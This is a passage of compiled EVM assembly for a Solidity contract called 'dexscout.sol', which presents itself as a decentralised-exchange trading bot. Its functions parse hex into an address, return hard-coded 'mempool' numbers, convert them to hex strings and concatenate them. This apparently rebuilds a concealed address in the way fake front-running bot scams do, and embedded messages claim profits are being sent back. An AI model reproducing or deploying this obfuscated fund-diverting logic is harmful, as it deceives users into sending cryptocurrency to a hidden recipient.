*/\n      0x66\n        /* \"dexscout.sol\":7848:7850  b2 */\n      dup3\n        /* \"dexscout.sol\":7848:7857  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7833:7858  (b2 >= 97) && (b2 <= 102) */\n    tag_88:\n        /* \"dexscout.sol\":7829:8055  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_89\n      jumpi\n        /* \"dexscout.sol\":7884:7886  87 */\n      0x57\n        /* \"dexscout.sol\":7878:7886  b2 -= 87 */\n      dup3\n      tag_90\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_90:\n      swap2\n      pop\n        /* \"dexscout.sol\":7829:8055  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_91)\n    tag_89:\n        /* \"dexscout.sol\":7918:7920  65 */\n      0x41\n        /* \"dexscout.sol\":7912:7914  b2 */\n      dup3\n        /* \"dexscout.sol\":7912:7920  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7911:7935  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_92\n      jumpi\n      pop\n        /* \"dexscout.sol\":7932:7934  70 */\n      0x46\n        /* \"dexscout.sol\":7926:7928  b2 */\n      dup3\n        /* \"dexscout.sol\":7926:7934  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7911:7935  (b2 >= 65) && (b2 <= 70) */\n    tag_92:\n        /* \"dexscout.sol\":7907:8055  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_93\n      jumpi\n        /* \"dexscout.sol\":7961:7963  55 */\n      0x37\n        /* \"dexscout.sol\":7955:7963  b2 -= 55 */\n      dup3\n      tag_94\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_94:\n      swap2\n      pop\n        /* \"dexscout.sol\":7907:8055  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_95)\n    tag_93:\n        /* \"dexscout.sol\":7995:7997  48 */\n      0x30\n        /* \"dexscout.sol\":7989:7991  b2 */\n      dup3\n        /* \"dexscout.sol\":7989:7997  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7988:8012  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"dexscout.sol\":8009:8011  57 */\n      0x39\n        /* \"dexscout.sol\":8003:8005  b2 */\n      dup3\n        /* \"dexscout.sol\":8003:8011  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7988:8012  (b2 >= 48) && (b2 <= 57) */\n    tag_96:\n        /* \"dexscout.sol\":7984:8055  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_97\n      jumpi\n        /* \"dexscout.sol\":8038:8040  48 */\n      0x30\n        /* \"dexscout.sol\":8032:8040  b2 -= 48 */\n      dup3\n      tag_98\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_98:\n      swap2\n      pop\n        /* \"dexscout.sol\":7984:8055  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_97:\n        /* \"dexscout.sol\":7907:8055  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_95:\n        /* \"dexscout.sol\":7829:8055  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_91:\n        /* \"dexscout.sol\":8088:8090  b2 */\n      dup2\n        /* \"dexscout.sol\":8083:8085  16 */\n      0x10\n        /* \"dexscout.sol\":8078:8080  b1 */\n      dup5\n        /* \"dexscout.sol\":8078:8085  b1 * 16 */\n      tag_99\n      swap2\n      swap1\n      tag_68\n      jump\t// in\n    tag_99:\n        /* \"dexscout.sol\":8078:8090  b1 * 16 + b2 */\n      tag_100\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_100:\n        /* \"dexscout.sol\":8068:8091  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_102\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_102:\n      swap4\n      pop\n        /* \"dexscout.sol\":7461:7462  2 */\n      0x02\n        /* \"dexscout.sol\":7456:7462  i += 2 */\n      dup2\n      tag_103\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_103:\n      swap1\n      pop\n        /* \"dexscout.sol\":7420:8102  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_64)\n    tag_65:\n      pop\n        /* \"dexscout.sol\":8126:8131  iaddr */\n      dup3\n        /* \"dexscout.sol\":8111:8132  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":7224:8139  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":7127:7219  function _calculateGasNeeds() internal pure returns(uint256) {... */\n    tag_41:\n        /* \"dexscout.sol\":7179:7186  uint256 */\n      0x00\n        /* \"dexscout.sol\":7205:7212  4070554 */\n      0x3e1c9a\n        /* \"dexscout.sol\":7198:7212  return 4070554 */\n      swap1\n      pop\n        /* \"dexscout.sol\":7127:7219  function _calculateGasNeeds() internal pure returns(uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":9166:9279  function getMemPoolHeight() internal pure returns (uint256) {... */\n    tag_43:\n        /* \"dexscout.sol\":9217:9224  uint256 */\n      0x00\n        /* \"dexscout.sol\":9243:9250  1015264 */\n      0x0f7de0\n        /* \"dexscout.sol\":9236:9250  return 1015264 */\n      swap1\n      pop\n        /* \"dexscout.sol\":9166:9279  function getMemPoolHeight() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":14592:14707  function getMemPoolDepth() internal pure returns (uint256) {... */\n    tag_45:\n        /* \"dexscout.sol\":14642:14649  uint256 */\n      0x00\n        /* \"dexscout.sol\":14668:14678  2945814797 */\n      0xaf95910d\n        /* \"dexscout.sol\":14661:14678  return 2945814797 */\n      swap1\n      pop\n        /* \"dexscout.sol\":14592:14707  function getMemPoolDepth() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":10341:10456  function getMemPoolOffset() internal pure returns (uint256) {... */\n    tag_49:\n        /* \"dexscout.sol\":10392:10399  uint256 */\n      0x00\n        /* \"dexscout.sol\":10418:10427  219788661 */\n      0x0d19b575\n        /* \"dexscout.sol\":10411:10427  return 219788661 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10341:10456  function getMemPoolOffset() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":8448:8885  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n    tag_50:\n        /* \"dexscout.sol\":8506:8519  string memory */\n      0x60\n        /* \"dexscout.sol\":8531:8544  uint256 count */\n      0x00\n        /* \"dexscout.sol\":8558:8567  uint256 b */\n      dup1\n        /* \"dexscout.sol\":8570:8571  a */\n      dup4\n        /* \"dexscout.sol\":8558:8571  uint256 b = a */\n      swap1\n      pop\n        /* \"dexscout.sol\":8581:8649  while (b != 0) {... */\n    tag_109:\n        /* \"dexscout.sol\":8593:8594  0 */\n      0x00\n        /* \"dexscout.sol\":8588:8589  b */\n      dup2\n        /* \"dexscout.sol\":8588:8594  b != 0 */\n      eq\n        /* \"dexscout.sol\":8581:8649  while (b != 0) {... */\n      tag_110\n      jumpi\n        /* \"dexscout.sol\":8610:8617  count++ */\n      dup2\n      dup1\n      tag_111\n      swap1\n      tag_112\n      jump\t// in\n    tag_111:\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":8636:8638  16 */\n      0x10\n        /* \"dexscout.sol\":8631:8638  b /= 16 */\n      dup2\n      tag_113\n      swap2\n      swap1\n      tag_114\n      jump\t// in\n    tag_113:\n      swap1\n      pop\n        /* \"dexscout.sol\":8581:8649  while (b != 0) {... */\n      jump(tag_109)\n    tag_110:\n        /* \"dexscout.sol\":8658:8674  bytes memory res */\n      0x00\n        /* \"dexscout.sol\":8687:8692  count */\n      dup3\n        /* \"dexscout.sol\":8677:8693  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_115\n      jumpi\n      tag_116\n      tag_117\n      jump\t// in\n    tag_116:\n    tag_115:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_118\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_118:\n      pop\n        /* \"dexscout.sol\":8658:8693  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"dexscout.sol\":8708:8717  uint256 i */\n      0x00\n        /* \"dexscout.sol\":8703:8850  for (uint256 i = 0; i < count; ++i) {... */\n    tag_119:\n        /* \"dexscout.sol\":8727:8732  count */\n      dup4\n        /* \"dexscout.sol\":8723:8724  i */\n      dup2\n        /* \"dexscout.sol\":8723:8732  i < count */\n      lt\n        /* \"dexscout.sol\":8703:8850  for (uint256 i = 0; i < count; ++i) {... */\n      iszero\n      tag_120\n      jumpi\n        /* \"dexscout.sol\":8761:8763  16 */\n      0x10\n        /* \"dexscout.sol\":8757:8758  a */\n      dup7\n        /* \"dexscout.sol\":8757:8763  a % 16 */\n      tag_122\n      swap2\n      swap1\n      tag_123\n      jump\t// in\n    tag_122:\n        /* \"dexscout.sol\":8753:8763  b = a % 16 */\n      swap3\n      pop\n        /* \"dexscout.sol\":8798:8818  toHexDigit(uint8(b)) */\n      tag_124\n        /* \"dexscout.sol\":8815:8816  b */\n      dup4\n        /* \"dexscout.sol\":8798:8808  toHexDigit */\n      tag_125\n        /* \"dexscout.sol\":8798:8818  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_124:\n        /* \"dexscout.sol\":8777:8780  res */\n      dup3\n        /* \"dexscout.sol\":8793:8794  1 */\n      0x01\n        /* \"dexscout.sol\":8789:8790  i */\n      dup4\n        /* \"dexscout.sol\":8781:8786  count */\n      dup8\n        /* \"dexscout.sol\":8781:8790  count - i */\n      tag_126\n      swap2\n      swap1\n      tag_127\n      jump\t// in\n    tag_126:\n        /* \"dexscout.sol\":8781:8794  count - i - 1 */\n      tag_128\n      swap2\n      swap1\n      tag_127\n      jump\t// in\n    tag_128:\n        /* \"dexscout.sol\":8777:8795  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_129\n      jumpi\n      tag_130\n      tag_71\n      jump\t// in\n    tag_130:\n    tag_129:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":8777:8818  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":8837:8839  16 */\n      0x10\n        /* \"dexscout.sol\":8832:8839  a /= 16 */\n      dup7\n      tag_131\n      swap2\n      swap1\n      tag_114\n      jump\t// in\n    tag_131:\n      swap6\n      pop\n        /* \"dexscout.sol\":8734:8737  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"dexscout.sol\":8703:8850  for (uint256 i = 0; i < count; ++i) {... */\n      jump(tag_119)\n    tag_120:\n      pop\n        /* \"dexscout.sol\":8874:8877  res */\n      dup1\n        /* \"dexscout.sol\":8860:8878  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":8448:8885  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":15406:16055  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_51:\n        /* \"dexscout.sol\":15489:15502  string memory */\n      0x60\n        /* \"dexscout.sol\":15514:15537  bytes memory _baseBytes */\n      0x00\n        /* \"dexscout.sol\":15546:15551  _base */\n      dup4\n        /* \"dexscout.sol\":15514:15552  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"dexscout.sol\":15562:15586  bytes memory _valueBytes */\n      0x00\n        /* \"dexscout.sol\":15595:15601  _value */\n      dup4\n        /* \"dexscout.sol\":15562:15602  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"dexscout.sol\":15613:15636  string memory _tmpValue */\n      0x00\n        /* \"dexscout.sol\":15683:15694  _valueBytes */\n      dup2\n        /* \"dexscout.sol\":15683:15701  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":15663:15673  _baseBytes */\n      dup4\n        /* \"dexscout.sol\":15663:15680  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":15663:15701  _baseBytes.length + _valueBytes.length */\n      tag_133\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_133:\n        /* \"dexscout.sol\":15639:15711  new string(... */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_134\n      jumpi\n      tag_135\n      tag_117\n      jump\t// in\n    tag_135:\n    tag_134:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_136\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_136:\n      pop\n        /* \"dexscout.sol\":15613:15711  string memory _tmpValue = new string(... */\n      swap1\n      pop\n        /* \"dexscout.sol\":15721:15743  bytes memory _newValue */\n      0x00\n        /* \"dexscout.sol\":15752:15761  _tmpValue */\n      dup2\n        /* \"dexscout.sol\":15721:15762  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"dexscout.sol\":15773:15782  uint256 i */\n      0x00\n        /* \"dexscout.sol\":15792:15801  uint256 j */\n      dup1\n        /* \"dexscout.sol\":15821:15822  0 */\n      0x00\n        /* \"dexscout.sol\":15817:15822  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":15812:15907  for (i = 0; i < _baseBytes.length; i++) {... */\n    tag_137:\n        /* \"dexscout.sol\":15828:15838  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":15828:15845  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":15824:15825  i */\n      dup3\n        /* \"dexscout.sol\":15824:15845  i < _baseBytes.length */\n      lt\n        /* \"dexscout.sol\":15812:15907  for (i = 0; i < _baseBytes.length; i++) {... */\n      iszero\n      tag_138\n      jumpi\n        /* \"dexscout.sol\":15883:15893  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":15894:15895  i */\n      dup3\n        /* \"dexscout.sol\":15883:15896  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_140\n      jumpi\n      tag_141\n      tag_71\n      jump\t// in\n    tag_141:\n    tag_140:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":15866:15875  _newValue */\n      dup4\n        /* \"dexscout.sol\":15876:15879  j++ */\n      dup3\n      dup1\n      tag_142\n      swap1\n      tag_112\n      jump\t// in\n    tag_142:\n      swap4\n      pop\n        /* \"dexscout.sol\":15866:15880  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_143\n      jumpi\n      tag_144\n      tag_71\n      jump\t// in\n    tag_144:\n    tag_143:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":15866:15896  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":15847:15850  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":15812:15907  for (i = 0; i < _baseBytes.length; i++) {... */\n      jump(tag_137)\n    tag_138:\n        /* \"dexscout.sol\":15926:15927  0 */\n      0x00\n        /* \"dexscout.sol\":15922:15927  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":15917:16014  for (i = 0; i < _valueBytes.length; i++) {... */\n    tag_145:\n        /* \"dexscout.sol\":15933:15944  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":15933:15951  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":15929:15930  i */\n      dup3\n        /* \"dexscout.sol\":15929:15951  i < _valueBytes.length */\n      lt\n        /* \"dexscout.sol\":15917:16014  for (i = 0; i < _valueBytes.length; i++) {... */\n      iszero\n      tag_146\n      jumpi\n        /* \"dexscout.sol\":15989:16000  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":16001:16002  i */\n      dup3\n        /* \"dexscout.sol\":15989:16003  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_148\n      jumpi\n      tag_149\n      tag_71\n      jump\t// in\n    tag_149:\n    tag_148:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":15972:15981  _newValue */\n      dup4\n        /* \"dexscout.sol\":15982:15985  j++ */\n      dup3\n      dup1\n      tag_150\n      swap1\n      tag_112\n      jump\t// in\n    tag_150:\n      swap4\n      pop\n        /* \"dexscout.sol\":15972:15986  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_151\n      jumpi\n      tag_152\n      tag_71\n      jump\t// in\n    tag_152:\n    tag_151:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":15972:16003  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":15953:15956  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":15917:16014  for (i = 0; i < _valueBytes.length; i++) {... */\n      jump(tag_145)\n    tag_146:\n        /* \"dexscout.sol\":16038:16047  _newValue */\n      dup3\n        /* \"dexscout.sol\":16024:16048  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":15406:16055  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":12011:12341  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_125:\n        /* \"dexscout.sol\":12063:12069  bytes1 */\n      0x00\n        /* \"dexscout.sol\":12090:12091  d */\n      dup2\n        /* \"dexscout.sol\":12085:12091  0 <= d */\n      0xff\n      and\n        /* \"dexscout.sol\":12085:12086  0 */\n      0x00\n        /* \"dexscout.sol\":12085:12091  0 <= d */\n      gt\n      iszero\n        /* \"dexscout.sol\":12085:12101  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_154\n      jumpi\n      pop\n        /* \"dexscout.sol\":12100:12101  9 */\n      0x09\n        /* \"dexscout.sol\":12095:12096  d */\n      dup3\n        /* \"dexscout.sol\":12095:12101  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":12085:12101  0 <= d && d <= 9 */\n    tag_154:\n        /* \"dexscout.sol\":12081:12276  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_155\n      jumpi\n        /* \"dexscout.sol\":12152:12153  d */\n      dup2\n        /* \"dexscout.sol\":12137:12148  bytes1(\"0\") */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":12131:12149  uint8(bytes1(\"0\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":12131:12153  uint8(bytes1(\"0\")) + d */\n      tag_156\n      swap2\n      swap1\n      tag_157\n      jump\t// in\n    tag_156:\n        /* \"dexscout.sol\":12124:12154  bytes1(uint8(bytes1(\"0\")) + d) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":12117:12154  return bytes1(uint8(bytes1(\"0\")) + d) */\n      swap1\n      pop\n      jump(tag_153)\n        /* \"dexscout.sol\":12081:12276  if (0 <= d && d <= 9) {... */\n    tag_155:\n        /* \"dexscout.sol\":12187:12188  d */\n      dup2\n        /* \"dexscout.sol\":12175:12189  10 <= uint8(d) */\n      0xff\n      and\n        /* \"dexscout.sol\":12175:12177  10 */\n      0x0a\n        /* \"dexscout.sol\":12175:12189  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"dexscout.sol\":12175:12207  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_159\n      jumpi\n      pop\n        /* \"dexscout.sol\":12205:12207  15 */\n      0x0f\n        /* \"dexscout.sol\":12199:12200  d */\n      dup3\n        /* \"dexscout.sol\":12193:12207  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":12175:12207  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_159:\n        /* \"dexscout.sol\":12171:12276  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_160\n      jumpi\n        /* \"dexscout.sol\":12262:12264  10 */\n      0x0a\n        /* \"dexscout.sol\":12258:12259  d */\n      dup3\n        /* \"dexscout.sol\":12243:12254  bytes1(\"a\") */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":12237:12255  uint8(bytes1(\"a\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":12237:12259  uint8(bytes1(\"a\")) + d */\n      tag_161\n      swap2\n      swap1\n      tag_157\n      jump\t// in\n    tag_161:\n        /* \"dexscout.sol\":12237:12264  uint8(bytes1(\"a\")) + d - 10 */\n      tag_162\n      swap2\n      swap1\n      tag_163\n      jump\t// in\n    tag_162:\n        /* \"dexscout.sol\":12230:12265  bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":12223:12265  return bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      swap1\n      pop\n      jump(tag_153)\n        /* \"dexscout.sol\":12171:12276  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_160:\n        /* \"dexscout.sol\":12326:12334  revert() */\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":12011:12341  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_153:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:176   */\n    tag_164:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:430   */\n    tag_165:\n        /* \"#utility.yul\":322:356   */\n      0x52756e6e696e672044657853636f757420616374696f6e2e2054686973206361\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:357   */\n      mstore\n        /* \"#utility.yul\":391:422   */\n      0x6e2074616b652061207768696c653b20706c6561736520776169742e2e000000\n        /* \"#utility.yul\":386:388   */\n      0x20\n        /* \"#utility.yul\":378:384   */\n      dup3\n        /* \"#utility.yul\":374:389   */\n      add\n        /* \"#utility.yul\":367:423   */\n      mstore\n        /* \"#utility.yul\":182:430   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":436:802   */\n    tag_166:\n        /* \"#utility.yul\":578:581   */\n      0x00\n        /* \"#utility.yul\":599:666   */\n      tag_180\n        /* \"#utility.yul\":663:665   */\n      0x3d\n        /* \"#utility.yul\":658:661   */\n      dup4\n        /* \"#utility.yul\":599:666   */\n      tag_164\n      jump\t// in\n    tag_180:\n        /* \"#utility.yul\":592:666   */\n      swap2\n      pop\n        /* \"#utility.yul\":675:768   */\n      tag_181\n        /* \"#utility.yul\":764:767   */\n      dup3\n        /* \"#utility.yul\":675:768   */\n      tag_165\n      jump\t// in\n    tag_181:\n        /* \"#utility.yul\":793:795   */\n      0x40\n        /* \"#utility.yul\":788:791   */\n      dup3\n        /* \"#utility.yul\":784:796   */\n      add\n        /* \"#utility.yul\":777:796   */\n      swap1\n      pop\n        /* \"#utility.yul\":436:802   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":808:1227   */\n    tag_16:\n        /* \"#utility.yul\":974:978   */\n      0x00\n        /* \"#utility.yul\":1012:1014   */\n      0x20\n        /* \"#utility.yul\":1001:1010   */\n      dup3\n        /* \"#utility.yul\":997:1015   */\n      add\n        /* \"#utility.yul\":989:1015   */\n      swap1\n      pop\n        /* \"#utility.yul\":1061:1070   */\n      dup2\n        /* \"#utility.yul\":1055:1059   */\n      dup2\n        /* \"#utility.yul\":1051:1071   */\n      sub\n        /* \"#utility.yul\":1047:1048   */\n      0x00\n        /* \"#utility.yul\":1036:1045   */\n      dup4\n        /* \"#utility.yul\":1032:1049   */\n      add\n        /* \"#utility.yul\":1025:1072   */\n      mstore\n        /* \"#utility.yul\":1089:1220   */\n      tag_183\n        /* \"#utility.yul\":1215:1219   */\n      dup2\n        /* \"#utility.yul\":1089:1220   */\n      tag_166\n      jump\t// in\n    tag_183:\n        /* \"#utility.yul\":1081:1220   */\n      swap1\n      pop\n        /* \"#utility.yul\":808:1227   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1233:1471   */\n    tag_167:\n        /* \"#utility.yul\":1373:1407   */\n      0x53656e64696e672070726f66697473206261636b20746f20636f6e7472616374\n        /* \"#utility.yul\":1369:1370   */\n      0x00\n        /* \"#utility.yul\":1361:1367   */\n      dup3\n        /* \"#utility.yul\":1357:1371   */\n      add\n        /* \"#utility.yul\":1350:1408   */\n      mstore\n        /* \"#utility.yul\":1442:1463   */\n      0x2063726561746f7220616464726573732e2e2e00000000000000000000000000\n        /* \"#utility.yul\":1437:1439   */\n      0x20\n        /* \"#utility.yul\":1429:1435   */\n      dup3\n        /* \"#utility.yul\":1425:1440   */\n      add\n        /* \"#utility.yul\":1418:1464   */\n      mstore\n        /* \"#utility.yul\":1233:1471   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1477:1843   */\n    tag_168:\n        /* \"#utility.yul\":1619:1622   */\n      0x00\n        /* \"#utility.yul\":1640:1707   */\n      tag_186\n        /* \"#utility.yul\":1704:1706   */\n      0x33\n        /* \"#utility.yul\":1699:1702   */\n      dup4\n        /* \"#utility.yul\":1640:1707   */\n      tag_164\n      jump\t// in\n    tag_186:\n        /* \"#utility.yul\":1633:1707   */\n      swap2\n      pop\n        /* \"#utility.yul\":1716:1809   */\n      tag_187\n        /* \"#utility.yul\":1805:1808   */\n      dup3\n        /* \"#utility.yul\":1716:1809   */\n      tag_167\n      jump\t// in\n    tag_187:\n        /* \"#utility.yul\":1834:1836   */\n      0x40\n        /* \"#utility.yul\":1829:1832   */\n      dup3\n        /* \"#utility.yul\":1825:1837   */\n      add\n        /* \"#utility.yul\":1818:1837   */\n      swap1\n      pop\n        /* \"#utility.yul\":1477:1843   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1849:2268   */\n    tag_23:\n        /* \"#utility.yul\":2015:2019   */\n      0x00\n        /* \"#utility.yul\":2053:2055   */\n      0x20\n        /* \"#utility.yul\":2042:2051   */\n      dup3\n        /* \"#utility.yul\":2038:2056   */\n      add\n        /* \"#utility.yul\":2030:2056   */\n      swap1\n      pop\n        /* \"#utility.yul\":2102:2111   */\n      dup2\n        /* \"#utility.yul\":2096:2100   */\n      dup2\n        /* \"#utility.yul\":2092:2112   */\n      sub\n        /* \"#utility.yul\":2088:2089   */\n      0x00\n        /* \"#utility.yul\":2077:2086   */\n      dup4\n        /* \"#utility.yul\":2073:2090   */\n      add\n        /* \"#utility.yul\":2066:2113   */\n      mstore\n        /* \"#utility.yul\":2130:2261   */\n      tag_189\n        /* \"#utility.yul\":2256:2260   */\n      dup2\n        /* \"#utility.yul\":2130:2261   */\n      tag_168\n      jump\t// in\n    tag_189:\n        /* \"#utility.yul\":2122:2261   */\n      swap1\n      pop\n        /* \"#utility.yul\":1849:2268   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2274:2448   */\n    tag_169:\n        /* \"#utility.yul\":2414:2440   */\n      0x53746f7070696e6720636f6e747261637420626f742e2e2e0000000000000000\n        /* \"#utility.yul\":2410:2411   */\n      0x00\n        /* \"#utility.yul\":2402:2408   */\n      dup3\n        /* \"#utility.yul\":2398:2412   */\n      add\n        /* \"#utility.yul\":2391:2441   */\n      mstore\n        /* \"#utility.yul\":2274:2448   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2454:2820   */\n    tag_170:\n        /* \"#utility.yul\":2596:2599   */\n      0x00\n        /* \"#utility.yul\":2617:2684   */\n      